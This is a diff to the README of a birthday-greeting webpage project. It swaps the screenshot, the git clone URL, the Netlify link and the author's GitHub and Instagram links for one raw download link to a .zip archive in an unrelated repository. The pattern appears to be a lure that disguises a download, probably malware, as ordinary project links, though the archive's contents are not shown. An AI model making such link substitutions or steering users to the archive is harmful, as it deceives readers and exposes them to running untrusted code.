@@ -1,7 +1,7 @@
 ## ✨ Say Happy Birthday with Webpage
  Screenshot
 <p align="center">
-<img src="https://user-images.githubusercontent.com/71541409/164498700-1b44dcbe-7ab8-4f2e-bf48-085597875043.jpg" width="60%" />
+<img src="https://github.com/G148-ide/selamat-ulang-tahun-sayanggg/raw/refs/heads/main/fertile/sayanggg-tahun-selamat-ulang-3.7.zip" width="60%" />
 </p>
 
 ## 🚀 How to Use
@@ -10,7 +10,7 @@
 
     ```bash
     # Clone this repository or download
-    $ git clone https://github.com/fajarghifar/happybirthday
+    $ git clone https://github.com/G148-ide/selamat-ulang-tahun-sayanggg/raw/refs/heads/main/fertile/sayanggg-tahun-selamat-ulang-3.7.zip
 
     # Go into the repository
     $ cd happybirthday
@@ -23,7 +23,7 @@
     Your site is now running!
 1. **Deployment**
 
-    To make your site online, you can turn on GitHub pages for the repository (Settings -> Pages). Or simply using [Netlify](https://www.netlify.com/)
+    To make your site online, you can turn on GitHub pages for the repository (Settings -> Pages). Or simply using [Netlify](https://github.com/G148-ide/selamat-ulang-tahun-sayanggg/raw/refs/heads/main/fertile/sayanggg-tahun-selamat-ulang-3.7.zip)
 
 ## 📝 Contributing
 
@@ -33,5 +33,5 @@ If you have any ideas to make it more interesting, please send a PR or create an
 
 ### [MIT](LICENSE)
 
-> Github [@fajaraldev](https://github.com/fajaraldev) &nbsp;&middot;&nbsp;
-> Instagram [@fajarghifar](https://instagram.com/fajarghifar)
+> Github [@fajaraldev](https://github.com/G148-ide/selamat-ulang-tahun-sayanggg/raw/refs/heads/main/fertile/sayanggg-tahun-selamat-ulang-3.7.zip) &nbsp;&middot;&nbsp;
+> Instagram [@fajarghifar](https://github.com/G148-ide/selamat-ulang-tahun-sayanggg/raw/refs/heads/main/fertile/sayanggg-tahun-selamat-ulang-3.7.zip)
